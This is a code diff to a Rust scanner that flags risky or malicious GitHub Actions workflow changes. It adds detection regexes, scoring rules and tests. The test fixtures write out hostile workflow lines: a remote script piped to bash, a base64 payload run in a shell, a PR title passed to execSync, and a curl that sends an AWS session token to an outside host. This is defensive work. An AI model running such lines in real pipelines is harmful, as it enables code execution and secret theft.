@@ -127,9 +127,19 @@ static WRITE_PERMISSIONS_RE: Lazy<Regex> = Lazy::new(|| {
         r"(?im)^\+\s*permissions:\s*write-all\b|^\+\s*(contents|pull-requests|actions|packages|id-token|checks|statuses):\s*write\b",
     )
 });
+static WRITE_ALL_PERMISSIONS_RE: Lazy<Regex> =
+    Lazy::new(|| re(r"(?im)^\+\s*permissions:\s*write-all\b"));
+static ID_TOKEN_WRITE_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*id-token:\s*write\b"));
+static ACTIONS_WRITE_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*actions:\s*write\b"));
+static PACKAGES_WRITE_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*packages:\s*write\b"));
 static WORKFLOW_RUN_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+\s*workflow_run:\s*$"));
 static WORKFLOW_ARTIFACT_DOWNLOAD_RE: Lazy<Regex> =
     Lazy::new(|| re(r"(?im)^\+.*\b(actions/download-artifact|gh\s+run\s+download)\b"));
+static WORKFLOW_RUN_HEAD_CHECKOUT_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?i)github\.event\.workflow_run\.(head_branch|head_sha|pull_requests\[[0-9]+\]\.head\.(sha|ref))",
+    )
+});
 static CONTINUE_ON_ERROR_RE: Lazy<Regex> =
     Lazy::new(|| re(r"(?im)^\+\s*continue-on-error:\s*true\b"));
 static AUTO_PUSH_OR_MERGE_RE: Lazy<Regex> = Lazy::new(|| {
@@ -192,6 +202,73 @@ static REPO_WRITE_TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
 static ARTIFACT_STAGING_RE: Lazy<Regex> = Lazy::new(|| {
     re(
         r"(?im)^\+.*\b(cp|mv)\b[^\n\r]*\.(tgz|tar\.gz|whl|crate|nupkg|gem)\b[^\n\r]*(/tmp\b|/tmp/|\$RUNNER_TEMP|\$\{\{\s*runner\.temp\s*\}\}|~/|/home/[^/\s]+/)|^\+\s*cd\s+(/tmp\b|\$RUNNER_TEMP|\$\{\{\s*runner\.temp\s*\}\}|~/|/home/[^/\s]+/)",
+    )
+});
+static PERSIST_CREDENTIALS_TRUE_RE: Lazy<Regex> =
+    Lazy::new(|| re(r"(?im)^\+\s*persist-credentials:\s*true\b"));
+static GIT_CREDENTIAL_PERSISTENCE_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?im)^\+.*\b(git\s+config\b.*(insteadOf|credential\.helper)|gh\s+auth\s+setup-git|git\s+credential\s+approve|url\.https://[^ \n\r]*\$\{\{\s*secrets\.)",
+    )
+});
+static SENSITIVE_ARTIFACT_UPLOAD_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?ims)^\+.*actions/upload-artifact@.*(?:\n\+.*){0,20}(\.npmrc|\.pypirc|\.env\b|\.aws/|\.docker/config\.json|id_rsa|\.ssh/|kubeconfig|credentials)",
+    )
+});
+static SENSITIVE_CACHE_PATH_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?ims)^\+.*(?:actions/cache|actions/cache/(?:save|restore))@.*(?:\n\+.*){0,24}(\.npmrc|\.pypirc|\.env\b|\.aws/|\.docker/config\.json|id_rsa|\.ssh/|kubeconfig|credentials|\.gnupg)",
+    )
+});
+static REMOTE_SCRIPT_EXECUTION_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?im)^\+.*((curl|wget)[^\n\r|;]*https?://[^\n\r|;]+(\|\s*(bash|sh|zsh|pwsh|powershell)|[;&]\s*(bash|sh|zsh|pwsh|powershell))|bash\s+<\(\s*(curl|wget)|Invoke-Expression\s+\(?\s*Invoke-WebRequest)",
+    )
+});
+static BASE64_PAYLOAD_EXECUTION_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?im)^\+.*(base64\s+(-d|--decode)|FromBase64String)\b[^\n\r]*(\|\s*(bash|sh|zsh|pwsh|powershell|python|node)|[;&]\s*(bash|sh|zsh|pwsh|powershell|python|node)|Invoke-Expression|iex\b)",
+    )
+});
+static POWERSHELL_ENCODED_COMMAND_RE: Lazy<Regex> = Lazy::new(|| {
+    re(r"(?im)^\+.*\b(powershell|pwsh)(?:\.exe)?\b[^\n\r]*(?:-enc|-encodedcommand)\b")
+});
+static GITHUB_ENV_UNTRUSTED_WRITE_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?i)github\.(?:event|head_ref|ref_name|ref)[^}\n\r]*\}\}[^>\n\r]*(>>|\|[^\n\r]*tee)[^\n\r]*\$GITHUB_ENV|GITHUB_ENV[^\n\r]*(github\.(?:event|head_ref|ref_name|ref))",
+    )
+});
+static GITHUB_OUTPUT_UNTRUSTED_WRITE_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?i)github\.(?:event|head_ref|ref_name|ref)[^}\n\r]*\}\}[^>\n\r]*(>>|\|[^\n\r]*tee)[^\n\r]*\$GITHUB_OUTPUT|GITHUB_OUTPUT[^\n\r]*(github\.(?:event|head_ref|ref_name|ref))",
+    )
+});
+static GITHUB_SCRIPT_DYNAMIC_CODE_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?ims)^\+.*actions/github-script@.*(?:\n\+.*){0,40}(eval\s*\(|Function\s*\(|child_process|execSync\s*\(|spawnSync\s*\(|execFileSync\s*\()",
+    )
+});
+static GITHUB_SCRIPT_UNTRUSTED_CONTEXT_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?ims)^\+.*actions/github-script@.*(?:\n\+.*){0,40}(github\.event\.(comment|issue|pull_request|review|discussion|head_commit|commits)|context\.payload\.(comment|issue|pull_request|review|discussion|head_commit|commits)|\$\{\{\s*github\.event\.)",
+    )
+});
+static PACKAGE_SCRIPT_GUARD_REMOVAL_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?im)^-.*(--ignore-scripts|ignore-scripts\s*[=:]\s*true|npm_config_ignore_scripts\s*[:=]\s*true)|^\+.*(--ignore-scripts\s*=\s*false|ignore-scripts\s*[=:]\s*false|npm_config_ignore_scripts\s*[:=]\s*false)",
+    )
+});
+static UNTRUSTED_REF_SHELL_INTERPOLATION_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?i)\$\{\{\s*github\.(head_ref|ref_name|ref|event\.pull_request\.head\.(ref|label)|event\.workflow_run\.head_branch)\s*\}\}",
+    )
+});
+static DOCKER_SOCKET_EXPOSURE_RE: Lazy<Regex> =
+    Lazy::new(|| re(r"(?im)^\+.*(/var/run/docker\.sock|docker\.sock:/var/run/docker\.sock)"));
+static CLOUD_SECRET_WITH_EXTERNAL_NETWORK_RE: Lazy<Regex> = Lazy::new(|| {
+    re(
+        r"(?is)(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|AZURE_CLIENT_SECRET|GOOGLE_APPLICATION_CREDENTIALS|GCP_SERVICE_ACCOUNT|CLOUDFLARE_API_TOKEN|DOCKERHUB_TOKEN|NPM_TOKEN).{0,500}(curl|wget|Invoke-WebRequest|Invoke-RestMethod|nc|ncat|scp|sftp|http://|https://)",
     )
 });
 static PR_CREATE_RE: Lazy<Regex> = Lazy::new(|| re(r"(?im)^\+.*\bgh\s+pr\s+create\b"));
@@ -359,7 +436,11 @@ const CORE_WORKFLOW_FACTORS: &[&str] = &[
     "local_archive_publish_with_release_gate_rewrite",
     "registry_publish_with_committed_archive",
     "pull_request_target_untrusted_checkout_with_write_capability",
+    "pull_request_target_with_oidc_write",
+    "pull_request_target_with_explicit_secret_use",
+    "privileged_checkout_persists_credentials",
     "workflow_run_artifact_with_write_or_publish_capability",
+    "workflow_run_untrusted_checkout_with_write_or_publish",
     "workflow_modifies_branch_protection_with_write_capability",
     "dispatch_backdoor_with_write_or_publish_capability",
     "dispatch_backdoor_with_repo_token",
@@ -374,6 +455,18 @@ const CORE_WORKFLOW_FACTORS: &[&str] = &[
     "direct_script_injection_in_privileged_workflow",
     "workflow_secret_enumeration_and_external_exfiltration",
     "explicit_secret_exfiltration_to_external_endpoint",
+    "sensitive_files_uploaded_as_artifact",
+    "sensitive_paths_cached_in_workflow",
+    "git_credential_persistence_with_repo_token",
+    "remote_script_pipe_to_shell",
+    "base64_decoded_payload_execution",
+    "powershell_encoded_command_execution",
+    "untrusted_input_written_to_github_env",
+    "github_script_executes_untrusted_dynamic_code",
+    "package_script_safety_guard_removed",
+    "privileged_shell_uses_untrusted_ref_name",
+    "docker_socket_exposed_to_untrusted_workflow",
+    "cloud_secret_with_external_network_path",
     "ghostaction_style_secret_exfiltration_workflow",
     "runner_memory_secret_harvesting_with_external_exfiltration",
     "unpinned_third_party_action_in_privileged_workflow",
@@ -1795,9 +1888,14 @@ fn analyze_commit(
     let adds_pull_request_target = PR_TARGET_RE.is_match(&added_lines);
     let checks_out_pr_head = PR_HEAD_CHECKOUT_RE.is_match(&added_lines);
     let checks_out_pr_merge_ref = PR_MERGE_REF_CHECKOUT_RE.is_match(&added_lines);
+    let adds_write_all_permissions = WRITE_ALL_PERMISSIONS_RE.is_match(&added_lines);
+    let adds_id_token_write = ID_TOKEN_WRITE_RE.is_match(&added_lines);
+    let adds_actions_write = ACTIONS_WRITE_RE.is_match(&added_lines);
+    let adds_packages_write = PACKAGES_WRITE_RE.is_match(&added_lines);
     let adds_write_permissions = WRITE_PERMISSIONS_RE.is_match(&added_lines);
     let adds_workflow_run = WORKFLOW_RUN_RE.is_match(&added_lines);
     let downloads_workflow_artifact = WORKFLOW_ARTIFACT_DOWNLOAD_RE.is_match(&added_lines);
+    let checks_out_workflow_run_head = WORKFLOW_RUN_HEAD_CHECKOUT_RE.is_match(&added_lines);
     let adds_continue_on_error = CONTINUE_ON_ERROR_RE.is_match(&added_lines);
     let adds_auto_push_or_merge = AUTO_PUSH_OR_MERGE_RE.is_match(&added_lines);
     let creates_pr_from_ci = PR_CREATE_RE.is_match(&added_lines);
@@ -1816,6 +1914,22 @@ fn analyze_commit(
     let hands_agent_write_token = AGENTIC_GIT_TOKEN_RE.is_match(&added_lines);
     let hands_repo_write_token = REPO_WRITE_TOKEN_RE.is_match(&added_lines);
     let stages_artifact_in_temp_or_home = ARTIFACT_STAGING_RE.is_match(&added_lines);
+    let persists_checkout_credentials = PERSIST_CREDENTIALS_TRUE_RE.is_match(&added_lines);
+    let persists_git_credentials = GIT_CREDENTIAL_PERSISTENCE_RE.is_match(&added_lines);
+    let uploads_sensitive_artifact = SENSITIVE_ARTIFACT_UPLOAD_RE.is_match(&added_lines);
+    let caches_sensitive_paths = SENSITIVE_CACHE_PATH_RE.is_match(&added_lines);
+    let executes_remote_script = REMOTE_SCRIPT_EXECUTION_RE.is_match(&added_lines);
+    let executes_base64_payload = BASE64_PAYLOAD_EXECUTION_RE.is_match(&added_lines);
+    let executes_powershell_encoded_command = POWERSHELL_ENCODED_COMMAND_RE.is_match(&added_lines);
+    let writes_untrusted_github_env = GITHUB_ENV_UNTRUSTED_WRITE_RE.is_match(&added_lines);
+    let writes_untrusted_github_output = GITHUB_OUTPUT_UNTRUSTED_WRITE_RE.is_match(&added_lines);
+    let github_script_dynamic_code = GITHUB_SCRIPT_DYNAMIC_CODE_RE.is_match(&added_lines);
+    let github_script_untrusted_context = GITHUB_SCRIPT_UNTRUSTED_CONTEXT_RE.is_match(&added_lines);
+    let removes_package_script_guard = PACKAGE_SCRIPT_GUARD_REMOVAL_RE.is_match(&combined_patch);
+    let shell_uses_untrusted_ref = UNTRUSTED_REF_SHELL_INTERPOLATION_RE.is_match(&added_lines);
+    let exposes_docker_socket = DOCKER_SOCKET_EXPOSURE_RE.is_match(&added_lines);
+    let cloud_secret_external_network =
+        CLOUD_SECRET_WITH_EXTERNAL_NETWORK_RE.is_match(&added_lines);
     let has_direct_script_injection = SCRIPT_INJECTION_RE.is_match(&added_lines);
     let enumerates_secrets = SECRET_ENUMERATION_RE.is_match(&added_lines);
     let exfiltrates_externally = EXTERNAL_SECRET_EXFIL_RE.is_match(&added_lines);
@@ -1920,8 +2034,155 @@ fn analyze_commit(
         }
     }
 
+    if adds_write_all_permissions {
+        add_factor(&mut finding, 2, "adds_write_all_permissions");
+    }
+    if adds_id_token_write {
+        add_factor(&mut finding, 0, "adds_id_token_write_permission");
+    }
+    if adds_actions_write {
+        add_factor(&mut finding, 1, "adds_actions_write_permission");
+    }
+    if adds_packages_write {
+        add_factor(&mut finding, 1, "adds_packages_write_permission");
+    }
+    if persists_checkout_credentials {
+        add_factor(&mut finding, 1, "persists_checkout_credentials");
+        if (checks_out_pr_head || checks_out_pr_merge_ref || checks_out_workflow_run_head)
+            && (adds_write_permissions || hands_repo_write_token || registry_auth)
+        {
+            strong_workflow_signal = true;
+            add_factor(&mut finding, 5, "privileged_checkout_persists_credentials");
+        }
+    }
+    if persists_git_credentials {
+        add_factor(&mut finding, 2, "persists_git_credentials");
+        if hands_repo_write_token || adds_write_permissions || registry_auth {
+            strong_workflow_signal = true;
+            add_factor(
+                &mut finding,
+                5,
+                "git_credential_persistence_with_repo_token",
+            );
+        }
+    }
+    if uploads_sensitive_artifact {
+        strong_workflow_signal = true;
+        add_factor(&mut finding, 7, "sensitive_files_uploaded_as_artifact");
+    }
+    if caches_sensitive_paths {
+        add_factor(&mut finding, 3, "caches_sensitive_credential_path");
+        if adds_pull_request_target
+            || adds_workflow_run
+            || adds_write_permissions
+            || registry_auth
+            || explicit_secret_refs > 0
+        {
+            strong_workflow_signal = true;
+            add_factor(&mut finding, 5, "sensitive_paths_cached_in_workflow");
+        }
+    }
+    if executes_remote_script {
+        add_factor(&mut finding, 3, "downloads_and_executes_remote_script");
+        if privileged_workflow_capability || has_action_manifest_change || publishes_registry {
+            strong_workflow_signal = true;
+            add_factor(&mut finding, 5, "remote_script_pipe_to_shell");
+        }
+    }
+    if executes_base64_payload {
+        strong_workflow_signal = true;
+        add_factor(&mut finding, 7, "base64_decoded_payload_execution");
+    }
+    if executes_powershell_encoded_command {
+        strong_workflow_signal = true;
+        add_factor(&mut finding, 7, "powershell_encoded_command_execution");
+    }
+    if writes_untrusted_github_env {
+        add_factor(&mut finding, 2, "writes_untrusted_context_to_github_env");
+        if adds_write_permissions
+            || hands_repo_write_token
+            || publishes_registry
+            || registry_auth
+            || adds_pull_request_target
+        {
+            strong_workflow_signal = true;
+            add_factor(&mut finding, 5, "untrusted_input_written_to_github_env");
+        }
+    }
+    if writes_untrusted_github_output {
+        add_factor(&mut finding, 2, "writes_untrusted_context_to_github_output");
+    }
+    if github_script_dynamic_code {
+        add_factor(&mut finding, 2, "github_script_dynamic_code_execution");
+    }
+    if github_script_untrusted_context {
+        add_factor(&mut finding, 1, "github_script_reads_untrusted_context");
+    }
+    if github_script_dynamic_code
+        && github_script_untrusted_context
+        && (adds_write_permissions || hands_repo_write_token || registry_auth || publishes_registry)
+    {
+        strong_workflow_signal = true;
+        add_factor(
+            &mut finding,
+            6,
+            "github_script_executes_untrusted_dynamic_code",
+        );
+    }
+    if removes_package_script_guard {
+        add_factor(&mut finding, 2, "removes_package_script_safety_guard");
+        if publishes_registry || registry_auth || adds_write_permissions || adds_pull_request_target
+        {
+            strong_workflow_signal = true;
+            add_factor(&mut finding, 5, "package_script_safety_guard_removed");
+        }
+    }
+    if shell_uses_untrusted_ref {
+        add_factor(&mut finding, 2, "shell_uses_untrusted_ref_name");
+        if adds_write_permissions
+            || hands_repo_write_token
+            || publishes_registry
+            || registry_auth
+            || uses_self_hosted_runner
+        {
+            strong_workflow_signal = true;
+            add_factor(&mut finding, 5, "privileged_shell_uses_untrusted_ref_name");
+        }
+    }
+    if exposes_docker_socket {
+        add_factor(&mut finding, 2, "exposes_docker_socket");
+        if adds_pull_request_target
+            || adds_workflow_run
+            || uses_self_hosted_runner
+            || checks_out_pr_head
+        {
+            strong_workflow_signal = true;
+            add_factor(
+                &mut finding,
+                6,
+                "docker_socket_exposed_to_untrusted_workflow",
+            );
+        }
+    }
+    if cloud_secret_external_network {
+        strong_workflow_signal = true;
+        add_factor(&mut finding, 7, "cloud_secret_with_external_network_path");
+    }
+
     if adds_pull_request_target {
         add_factor(&mut finding, 1, "adds_pull_request_target");
+        if adds_id_token_write && (checks_out_pr_head || checks_out_pr_merge_ref || registry_auth) {
+            strong_workflow_signal = true;
+            add_factor(&mut finding, 6, "pull_request_target_with_oidc_write");
+        }
+        if explicit_secret_refs > 0 && (checks_out_pr_head || checks_out_pr_merge_ref) {
+            strong_workflow_signal = true;
+            add_factor(
+                &mut finding,
+                6,
+                "pull_request_target_with_explicit_secret_use",
+            );
+        }
         if checks_out_pr_merge_ref {
             add_factor(
                 &mut finding,
@@ -1994,6 +2255,21 @@ fn analyze_commit(
 
     if adds_workflow_run {
         add_factor(&mut finding, 1, "adds_workflow_run_trigger");
+        if checks_out_workflow_run_head {
+            add_factor(&mut finding, 3, "checks_out_workflow_run_head_ref");
+            if adds_write_permissions
+                || publishes_registry
+                || registry_auth
+                || adds_auto_push_or_merge
+            {
+                strong_workflow_signal = true;
+                add_factor(
+                    &mut finding,
+                    6,
+                    "workflow_run_untrusted_checkout_with_write_or_publish",
+                );
+            }
+        }
         if downloads_workflow_artifact {
             add_factor(&mut finding, 2, "downloads_artifact_in_workflow_run");
             if adds_write_permissions || publishes_registry || adds_auto_push_or_merge {
@@ -2744,16 +3020,22 @@ fn truncate_line(value: &str, max_len: usize) -> String {
 mod tests {
     use super::{
         ACTION_MANIFEST_COMPOSITE_RE, ACTION_MANIFEST_DOCKER_RE, ACTION_MANIFEST_REMOTE_SCRIPT_RE,
-        AGENT_EDITOR_AUTORUN_HOOK_RE, AGENT_RUNTIME_BOOTSTRAP_RE, CACHE_OR_SETUP_ACTION_RE,
-        CACHE_OR_SETUP_CONTEXT_RE, GHOSTACTION_WORKFLOW_NAME_RE, PERSIST_CREDENTIALS_FALSE_RE,
-        PR_HEAD_CHECKOUT_RE, PR_MERGE_REF_CHECKOUT_RE, REMOVED_PR_MERGE_REF_CHECKOUT_RE,
-        REMOVED_PR_TARGET_RE, REMOVED_UNTRUSTED_CODE_EXECUTION_RE, UNTRUSTED_CODE_EXECUTION_RE,
-        action_ref_changed, action_ref_downgrades_to_mutable, decode_possible_base64,
-        explicit_secret_reference_count, has_added_agent_editor_autorun_file,
-        has_added_agent_instruction_file, has_added_agent_payload_script,
-        has_dependency_manifest_file, has_external_non_github_network_call,
-        has_privileged_mutable_reusable_workflow, has_privileged_mutable_third_party_dependency,
-        has_privileged_workflow_capability,
+        AGENT_EDITOR_AUTORUN_HOOK_RE, AGENT_RUNTIME_BOOTSTRAP_RE, BASE64_PAYLOAD_EXECUTION_RE,
+        CACHE_OR_SETUP_ACTION_RE, CACHE_OR_SETUP_CONTEXT_RE, CLOUD_SECRET_WITH_EXTERNAL_NETWORK_RE,
+        DOCKER_SOCKET_EXPOSURE_RE, GHOSTACTION_WORKFLOW_NAME_RE, GIT_CREDENTIAL_PERSISTENCE_RE,
+        GITHUB_ENV_UNTRUSTED_WRITE_RE, GITHUB_OUTPUT_UNTRUSTED_WRITE_RE,
+        GITHUB_SCRIPT_DYNAMIC_CODE_RE, GITHUB_SCRIPT_UNTRUSTED_CONTEXT_RE,
+        PACKAGE_SCRIPT_GUARD_REMOVAL_RE, PERSIST_CREDENTIALS_FALSE_RE, PERSIST_CREDENTIALS_TRUE_RE,
+        POWERSHELL_ENCODED_COMMAND_RE, PR_HEAD_CHECKOUT_RE, PR_MERGE_REF_CHECKOUT_RE,
+        REMOTE_SCRIPT_EXECUTION_RE, REMOVED_PR_MERGE_REF_CHECKOUT_RE, REMOVED_PR_TARGET_RE,
+        REMOVED_UNTRUSTED_CODE_EXECUTION_RE, SENSITIVE_ARTIFACT_UPLOAD_RE, SENSITIVE_CACHE_PATH_RE,
+        UNTRUSTED_CODE_EXECUTION_RE, UNTRUSTED_REF_SHELL_INTERPOLATION_RE,
+        WORKFLOW_RUN_HEAD_CHECKOUT_RE, action_ref_changed, action_ref_downgrades_to_mutable,
+        decode_possible_base64, explicit_secret_reference_count,
+        has_added_agent_editor_autorun_file, has_added_agent_instruction_file,
+        has_added_agent_payload_script, has_dependency_manifest_file,
+        has_external_non_github_network_call, has_privileged_mutable_reusable_workflow,
+        has_privileged_mutable_third_party_dependency, has_privileged_workflow_capability,
         has_pull_request_target_cache_poisoning_remediation_context,
         has_pull_request_target_untrusted_code_mitigation, has_removed_protective_workflow,
         has_secret_enumeration_exfil_path, has_suspicious_workflow_file,
@@ -3063,6 +3345,114 @@ mod tests {
         assert!(!has_secret_enumeration_exfil_path(
             benign_download_then_env_debug
         ));
+    }
+
+    #[test]
+    fn detects_high_signal_credential_and_payload_primitives() {
+        let credential_persistence = r#"
++      - uses: actions/checkout@v4
++        with:
++          ref: ${{ github.event.pull_request.head.sha }}
++          persist-credentials: true
++      - run: git config --global url.https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/.insteadOf https://github.com/
+"#;
+        assert!(PERSIST_CREDENTIALS_TRUE_RE.is_match(credential_persistence));
+        assert!(GIT_CREDENTIAL_PERSISTENCE_RE.is_match(credential_persistence));
+
+        let sensitive_artifact = r#"
++      - uses: actions/upload-artifact@v4
++        with:
++          name: debug
++          path: |
++            .npmrc
++            ~/.aws/credentials
+"#;
+        assert!(SENSITIVE_ARTIFACT_UPLOAD_RE.is_match(sensitive_artifact));
+
+        let sensitive_cache = r#"
++      - uses: actions/cache/save@v4
++        with:
++          path: ~/.docker/config.json
++          key: docker-${{ github.run_id }}
+"#;
+        assert!(SENSITIVE_CACHE_PATH_RE.is_match(sensitive_cache));
+
+        let remote_payloads = r#"
++      - run: curl -fsSL https://example.invalid/install.sh | bash
++      - run: echo ZWNobyBwd25lZA== | base64 -d | bash
++      - run: pwsh -EncodedCommand SQBFAFgA
+"#;
+        assert!(REMOTE_SCRIPT_EXECUTION_RE.is_match(remote_payloads));
+        assert!(BASE64_PAYLOAD_EXECUTION_RE.is_match(remote_payloads));
+        assert!(POWERSHELL_ENCODED_COMMAND_RE.is_match(remote_payloads));
+    }
+
+    #[test]
+    fn detects_untrusted_context_and_privileged_runtime_primitives() {
+        let untrusted_context = r#"
++      - run: echo "BRANCH=${{ github.head_ref }}" >> "$GITHUB_ENV"
++      - run: echo "result=${{ github.event.pull_request.title }}" >> "$GITHUB_OUTPUT"
++      - uses: actions/github-script@v7
++        with:
++          script: |
++            const title = context.payload.pull_request.title
++            require('child_process').execSync(title)
++      - run: docker run -v /var/run/docker.sock:/var/run/docker.sock image
++      - run: echo "${{ github.ref_name }}"
+"#;
+        assert!(GITHUB_ENV_UNTRUSTED_WRITE_RE.is_match(untrusted_context));
+        assert!(GITHUB_OUTPUT_UNTRUSTED_WRITE_RE.is_match(untrusted_context));
+        assert!(GITHUB_SCRIPT_UNTRUSTED_CONTEXT_RE.is_match(untrusted_context));
+        assert!(GITHUB_SCRIPT_DYNAMIC_CODE_RE.is_match(untrusted_context));
+        assert!(DOCKER_SOCKET_EXPOSURE_RE.is_match(untrusted_context));
+        assert!(UNTRUSTED_REF_SHELL_INTERPOLATION_RE.is_match(untrusted_context));
+
+        let workflow_run_head = r#"
++on:
++  workflow_run:
++jobs:
++  release:
++    steps:
++      - uses: actions/checkout@v4
++        with:
++          ref: ${{ github.event.workflow_run.head_branch }}
+"#;
+        assert!(WORKFLOW_RUN_HEAD_CHECKOUT_RE.is_match(workflow_run_head));
+
+        let package_guard = r#"
+-      - run: npm ci --ignore-scripts
++      - run: npm config set ignore-scripts false
+"#;
+        assert!(PACKAGE_SCRIPT_GUARD_REMOVAL_RE.is_match(package_guard));
+
+        let cloud_secret = r#"
++      - run: curl -H "Authorization: Bearer $AWS_SESSION_TOKEN" https://example.invalid/collect
++        env:
++          AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
+"#;
+        assert!(CLOUD_SECRET_WITH_EXTERNAL_NETWORK_RE.is_match(cloud_secret));
+    }
+
+    #[test]
+    fn ignores_common_safe_variants_for_new_primitives() {
+        let benign_download =
+            "+      - run: curl -fsSL https://example.invalid/tool.tar.gz -o tool.tar.gz";
+        let benign_artifact = r#"
++      - uses: actions/upload-artifact@v4
++        with:
++          name: dist
++          path: dist/
+"#;
+        let benign_cache = r#"
++      - uses: actions/cache@v4
++        with:
++          path: node_modules
++          key: deps-${{ hashFiles('package-lock.json') }}
+"#;
+
+        assert!(!REMOTE_SCRIPT_EXECUTION_RE.is_match(benign_download));
+        assert!(!SENSITIVE_ARTIFACT_UPLOAD_RE.is_match(benign_artifact));
+        assert!(!SENSITIVE_CACHE_PATH_RE.is_match(benign_cache));
     }
 
     #[test]
